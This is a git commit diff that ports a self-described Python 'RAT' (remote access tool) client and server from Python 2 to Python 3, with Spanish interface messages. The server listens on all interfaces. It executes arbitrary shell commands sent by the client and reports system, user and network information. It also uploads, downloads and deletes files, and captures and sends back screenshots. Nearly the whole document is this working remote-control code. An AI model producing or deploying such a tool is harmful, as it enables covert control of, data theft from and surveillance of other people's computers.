02f17f55ef83eec99319a268706814659e38cbb1
Pablo Rubio <paruma@protonmail.ch>
2020-05-05 12:23:49 +0200

    Add files via upload

--- client.py
+++ client.py
@@ -1,124 +1,146 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-#RAT client by Pablo Rubio
+# RAT client by Pablo Rubio
 
 import socket
 from socket import error
 import os
- 
+
 server = "127.0.0.1"
-port = 45456
+port = 45454
 array = []
 
+
 def main():
-	
-	os.system('clear')
-	print "*************************"
-	print "RAT Client by Pablo Rubio"
-	print "*************************"
-	print "[*] Comandos disponibles"
-	print "*************************"
-	print "--> list 	(List files)"
-	print "--> info 	(System info)"
-	print "--> cd 		(Change directory. Add the directory like args)"
-	print "--> trasfer 	(Upload & Download files)"
-	print "--> delete 	(Delete a file)"
-	print "--> screenshot	(Take a screenshot)"
-	print "--> shell	(Execute a shell command)"
-	print "--> close 	(Close conection)"
-	print "*************************"
-	print
 
-	while(True):
-		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		client.connect((server, port))
-		print ''
-		msg = raw_input("[*] Comando a ejecutar: ")
-		array = msg.split(" ")
+    os.system('clear')
+    print("*************************")
+    print("RAT Client by Pablo Rubio")
+    print("*************************")
+    print("[*] Comandos disponibles")
+    print("*************************")
+    print("--> list     (List files)")
+    print("--> info     (System info)")
+    print("--> cd       (Change directory. Add the directory like args)")
+    print("--> trasfer  (Upload & Download files)")
+    print("--> delete   (Delete a file)")
+    print("--> screenshot   (Take a screenshot)")
+    print("--> shell    (Execute a shell command)")
+    print("--> close    (Close conection)")
+    print("*************************")
+    print('')
 
-		if 'list' in array[0]:
-			print "[*] Listando archivos:"
-			client.send(array[0]);
+    while(True):
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.connect((server, port))
+        print('')
+        msg = input("[*] Comando a ejecutar: ")
+        array = msg.split(" ")
 
-		elif 'info' in array[0]:
-			print "[*] Recopilando informacion del sistema:"
-			client.send(array[0])
+        if 'list' in array[0]:
+            print("[*] Listando archivos:")
+            client.send(array[0].encode())
 
-		elif 'cd' in array[0]:
-			if len(array) == 1:
-				print "Debe introducir la ruta"
-				continue
-			client.send(array[0]+' '+array[1])
+        elif 'info' in array[0]:
+            print("[*] Recopilando informacion del sistema:")
+            client.send(array[0].encode())
 
-		elif 'shell' in array[0]:
-			orden = raw_input("[*] Comando shell a ejecutar: ")
-			client.send(array[0]+' '+orden)
-			
+        elif 'cd' in array[0]:
+            if len(array) == 1:
+                print("Debe introducir la ruta")
+                continue
+            client.send((array[0]+' '+array[1]).encode())
 
-		elif 'close' in array[0]:
-			client.send(array[0]);
-			print "[_] Cerrando conexion."
-			client.close()
-			exit(0)
+        elif 'shell' in array[0]:
+            orden = input("[*] Comando shell a ejecutar: ")
+            client.send((array[0]+' '+orden).encode())
 
-		elif 'transfer' in array[0]:	
-			orden = raw_input("[*] Upload (u) // Download (d): ")
-			if 'u' in orden:
-				archivo = raw_input("[*] Ruta del archivo a subir: ")
-				client.send('up'+' '+archivo)
-				response = client.recv(1024)
-				if 'go' in response:
-					f = open(archivo,'rb')
-					print '[*] Sending...'
-					l = f.read(1024)
-					while (l):
-    						print '[*] Sending...'
-    						client.send(l)
-    						l = f.read(1024)
-					f.close()
-					print "[*] Archivo enviado."
-					client.shutdown(socket.SHUT_WR)
-					print client.recv(1024)
-					client.close         
-    					print("[*] El archivo ha sido enviado correctamente.")
-				else:
-					print("[-] Error al enviar datos.")
-					continue
+        elif 'close' in array[0]:
+            client.send(array[0].encode())
+            print("[_] Cerrando conexion.")
+            break
 
-			elif 'd' in orden:
-				archivo = raw_input("[*] Ruta del archivo a descargar: ")
-				client.send('down'+' '+archivo)
-				path = archivo.split("/")
-				name = path[-1] 
-				f = open(name, "wb")
-	    			print "[*] Receiving..."
-    				l = client.recv(1024)
-    				while (True):
-        				f.write(l)
-        				l = client.recv(1024)
-					if (len(l) < 1024):
-						break
-    				f.close()             
-				print("[*] El archivo se ha recibido correctamente.")
+        elif 'transfer' in array[0]:
+            orden = input("[*] Upload (u) // Download (d): ")
 
-			else:
-				print '[-] Orden erronea, intentelo de nuevo.'
+            while (orden != 'u') and (orden !='d'):
+                orden = input("[*] Orden incorrecta --> Upload (u) // Download (d)?: ")
 
-		elif 'delete' in array[0]:
-			archivo = raw_input("[*] Ruta del archivo a borrar: ")
-			client.send(array[0]+' '+archivo)
-	
-		elif 'screenshot' in array[0]:	
-			client.send(array[0])		
+            if 'u' in orden:
+                archivo = input("[*] Ruta del archivo a subir: ")
+                client.send(('up'+' '+archivo).encode())
+                response = client.recv(1024).decode()
+                if 'go' in response:
+                    print('[*] Sending...')
+                    f = open(archivo, 'rb')
+                    l = f.read(1024)
+                    while (l):
+                        client.send(l)
+                        l = f.read(1024)
+                    f.close()
+                    client.send(('fin_archivo').encode())
+                    print("[*] Archivo enviado.")
+                else:
+                    print("[-] Error al enviar datos.")
+                    continue
 
-		else:
-			raw_input("[-] Comando no disponible. Pulse cualquier tecla para continuar.")
-			continue
+            elif 'd' in orden:
+                archivo = input("[*] Ruta del archivo a descargar: ")
+                client.send(('down'+' '+archivo).encode())
+                path = archivo.split("/")
+                name = path[-1]
+                f = open(name, "wb")
+                print("[*] Receiving...")
+                l = client.recv(1024)
+                if 'fail' in l.decode():
+                    print('[-] El archivo no existe.')
+                    continue
 
-		response = client.recv(4096)
-		print response
-		
+                while (True):
+                    f.write(l)
+                    l = client.recv(1024)
+                    if (len(l) < 1024):
+                        break
+                f.close()
+                print("[*] El archivo se ha recibido correctamente.")
+
+            else:
+                print('[-] Orden erronea, intentelo de nuevo.')
+
+        elif 'delete' in array[0]:
+            archivo = input("[*] Ruta del archivo a borrar: ")
+            client.send((array[0]+' '+archivo).encode())
+
+        elif 'screenshot' in array[0]:
+            client.send(array[0].encode())
+            screen = client.recv(1024).decode()
+            if 'ok' in screen:
+                print("[*] Captura de pantalla tomada con éxito")
+                client.send(('down').encode())
+                f = open('screenshot.png',"wb")
+                print("[*] Receiving...")
+                l = client.recv(1024)
+                while (True):
+                    f.write(l)
+                    l = client.recv(1024)
+                    if (len(l) < 1024):
+                        break
+                f.close()
+                print("[*] La captura de pantalla se ha recibido y borrado del server correctamente.")
+
+            else:
+                print("Error al tomar la captura de pantalla")
+
+        else:
+            input("[-] Comando no disponible. Pulse cualquier tecla para continuar.")
+            continue
+
+        response = client.recv(1024)
+        print (response)
+    
+    #fin while
+    client.close()
 
 if __name__ == '__main__':
-	main()
+    main()
--- server.py
+++ server.py
@@ -1,7 +1,7 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-#RAT server by Pablo Rubio
+# RAT server by Pablo Rubio
 
 import socket
 from socket import error
@@ -10,133 +10,150 @@ import os
 import platform
 from subprocess import Popen
 from subprocess import PIPE
-import gtk.gdk
- 
+from gi.repository import Gdk
+
+
+
 ip = "0.0.0.0"
-port = 45456
+port = 45454
 max_conections = 5
-array= []
+array = []
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
 
 def admin(socket_client):
 
-	request = socket_client.recv(1024)
-	response = ''
-	array = request.split(" ")
-	print "[*] Mensaje recibido: %s" % array[0]
+    request = socket_client.recv(1024).decode()
+    response = ''
+    array = request.split(" ")
+    print("[*] Mensaje recibido: ", array[0])
 
-	if 'list' in array[0]:
-		response = "[*] Directorio actual --> " + Popen('pwd', shell=True, stdout=PIPE).stdout.read()
-		response += Popen('ls', shell=True, stdout=PIPE).stdout.read()
+    if 'list' in array[0]:
+        response = ("[*] Directorio actual --> ") + str(Popen('pwd', shell=True, stdout=PIPE).stdout.read()) + '\n'
+        response += str(Popen('ls', shell=True, stdout=PIPE).stdout.read()) + '\n'
 
-	elif 'info' in array[0]:
-		response = "[*] Sys_Info 	-->	" + Popen('uname -a', shell=True, stdout=PIPE).stdout.read()
-		response += "[*] User 	-->	" + Popen('whoami', shell=True, stdout=PIPE).stdout.read()
-		response += "[*] Path 	-->	" + Popen('pwd', shell=True, stdout=PIPE).stdout.read()
-		osInfo = platform.uname()
-		response += "[*] Pc name	-->	" + str(osInfo[1])       
-		response += "[*] Net_Info 	-->	" + Popen('ifconfig', shell=True, stdout=PIPE).stdout.read()
+    elif 'info' in array[0]:
+        response = "[*] Sys_Info 	-->	" + str(Popen('uname -a', shell=True, stdout=PIPE).stdout.read()) + '\n'
+        response += "[*] User 	-->	" + str(Popen('whoami', shell=True, stdout=PIPE).stdout.read()) + '\n'
+        response += "[*] Path 	-->	" + str(Popen('pwd', shell=True, stdout=PIPE).stdout.read()) + '\n'
+        osInfo = platform.uname()
+        response += "[*] Pc name	-->	" + str(osInfo[1]) + '\n'
+        response += "[*] Net_Info 	-->	" + str(Popen('ifconfig', shell=True, stdout=PIPE).stdout.read()) + '\n'
 
-	elif 'cd' in array[0]:
-		if os.path.isdir(array[1]):
-            		os.chdir(array[1])
-            		response = "[*] Directorio actual --> " + array[1]
-                else:
-			response = "[_] Directorio erroneo."
+    elif 'cd' in array[0]:
+        if os.path.isdir(array[1]):
+            os.chdir(array[1])
+            response = "[*] Directorio actual --> " + array[1]
+        else:
+            response = "[_] Directorio erroneo."
 
-	elif 'shell' in array[0]:
-		command = ''
-		for i in array:
-			if not 'shell' in i:
-				command += i + ' '
-		response = "[*] " + Popen(command, shell=True, stdout=PIPE).stdout.read()
+    elif 'shell' in array[0]:
+        command = ''
+        for i in array:
+            if not 'shell' in i:
+                command += i + ' '
+        response = "[*] " + str(Popen(command, shell=True, stdout=PIPE).stdout.read())
 
-	elif 'up' in array[0]:
-		path = array[1].split("/")
-		name = path[-1] 
-		f = open(name, "wb")
-		socket_client.send("go")		
-	    	print "[*] Receiving..."
-    		l = socket_client.recv(1024)
-    		while (True):
-        		print "[*] Receiving..."
-        		f.write(l)
-        		l = socket_client.recv(1024)
-			if (len(l) < 1024):
-				break
-    		f.close()
-    		print "[*] Archivo recibido."
-    		socket_client.send('[*] Server --> Archivo recibido.')
-		print("[*] El archivo se ha recibido correctamente.")
-		response = "[*] Server --> Data OK."
-		
-	elif 'down' in array[0]:
-		f = open(array[1],'rb')
-		print '[*] Sending...'
-		l = f.read(1024)
-		while (l):
-   			socket_client.send(l)
-   			l = f.read(1024)
-		f.close()
-		print "[*] Archivo enviado."
-		socket_client.shutdown(socket.SHUT_WR)
-		print socket_client.recv(1024)
-		socket_client.close         
-    		print("[*] El archivo ha sido enviado correctamente.")
-				
-	elif 'close' in array[0]:
-		print "[_] Cerrando conexion."
-		server.close()	
-		socket_client.close()
-		exit(0)	
+    elif 'up' in array[0]:
+        path = array[1].split("/")
+        name = path[-1]
+        f = open(name, "wb")
+        socket_client.send(("go").encode())
+        print("[*] Receiving...")
+        l = socket_client.recv(1024)
+        while (l):
+            f.write(l)
+            l = socket_client.recv(1024)
+            print(l)
+            if 'fin_archivo' in l.decode():
+                break
+        f.close()
+        response = "[*] Server --> Archivo recibido."
+        socket_client.send(response.encode())
+        print("[*] Archivo recibido.")
 
-	elif 'delete' in array[0]:
-		if os.path.isfile(array[1]):
-			os.remove(array[1])
-			response = '[*] Archivo borrado exitosamente.'
-		elif os.path.isdir(array[1]):
-			os.rmdir(array[1])
-			response = '[*] Directorio borrado exitosamente.'
-		else:
-			response = '[-] No se ha podido borrar el archivo/directorio' 
+    elif 'down' in array[0]:
+        if os.path.isfile(array[1]):
+            f = open(array[1], 'rb')
+            print('[*] Sending...')
+            l = f.read(1024)
+            while (l):
+                socket_client.send(l)
+                l = f.read(1024)
+            f.close()
+            response = "[*] Server --> Archivo enviado."
+            print("[*] Archivo enviado.")
+        else:
+            response = "[*] Server --> El archivo no existe."
+            socket_client.send('fail')
+            print("[-] El archivo no existe.")
 
-	elif 'screenshot' in array[0]:
-		w = gtk.gdk.get_default_root_window()
-		sz = w.get_size()
-		print "[*] The size of the window is %d x %d" % sz
-		pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
-		pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
-		if (pb != None):
-		    	pb.save("screenshot.png","png")
-			response = "[*] Screenshot saved to screenshot.png. (Download it from server¡¡¡)"
-			print response
-		else:
-		    	response = "[-] Unable to get the screenshot."
-			print response
-		
-		
+    elif 'close' in array[0]:
+        print("[_] Cerrando conexion.")
+        server.close()
+        socket_client.close()
+        exit()
 
-	socket_client.send(response)
-	socket_client.close()
-	print ''
+    elif 'delete' in array[0]:
+        if os.path.isfile(array[1]):
+            os.remove(array[1])
+            response = '[*] Archivo borrado exitosamente.'
+        elif os.path.isdir(array[1]):
+            os.rmdir(array[1])
+            response = '[*] Directorio borrado exitosamente.'
+        else:
+            response = '[-] No se ha podido borrar el archivo/directorio'
+
+    elif 'screenshot' in array[0]:
+        window = Gdk.get_default_root_window()
+        x, y, width, height = window.get_geometry()
+        print("The size of the root window is {} x {}".format(width, height))
+        pb = Gdk.pixbuf_get_from_window(window, x, y, width, height)
+        if (pb != None):
+            pb.savev("a1.png","png", (), ())
+            response = "ok"
+            socket_client.send(response.encode())
+            screen = socket_client.recv(1024).decode()
+            if 'down' in screen:
+                f = open("a1.png", 'rb')
+                print('[*] Sending...')
+                l = f.read(1024)
+                while (l):
+                    socket_client.send(l)
+                    l = f.read(1024)
+                f.close()
+                response = "[*] Server --> Archivo enviado."
+                print(response)
+                if os.path.isfile("a1.png"):
+                    os.remove("a1.png")
+                elif os.path.isdir("a1.png"):
+                    os.rmdir("a1.png")
+
+        else:
+            response = "fail"
+
+    socket_client.send(response.encode())
+    socket_client.close()
+    print('')
+
 
 def main():
-	server.bind((ip, port))
-	server.listen(max_conections)
-	print "[*] Esperando conexiones en %s:%d" % (ip, port)
- 
-	while(True):
-		client, direction = server.accept()
-		print "[*] Conexion establecida con %s:%d" % (direction[0], direction[1])
-		rat = threading.Thread(target=admin, args=(client,))
-		rat.start()
+    server.bind((ip, port))
+    server.listen(max_conections)
+    print("[*] Esperando conexiones en ", ip+":", port)
+
+    while(True):
+        client, direction = server.accept()
+        print("[*] Conexion establecida con ", direction[0]+":", direction[1])
+        rat = threading.Thread(target=admin, args=(client,))
+        rat.start()
 
 
 if __name__ == '__main__':
 
-	os.system('clear')
-	print "*************************"
-	print "RAT Server by Pablo Rubio"
-	print "*************************"
-	print''
-	main()
+    os.system('clear')
+    print("*************************")
+    print("RAT Server by Pablo Rubio")
+    print("*************************")
+    print('')
+    main()
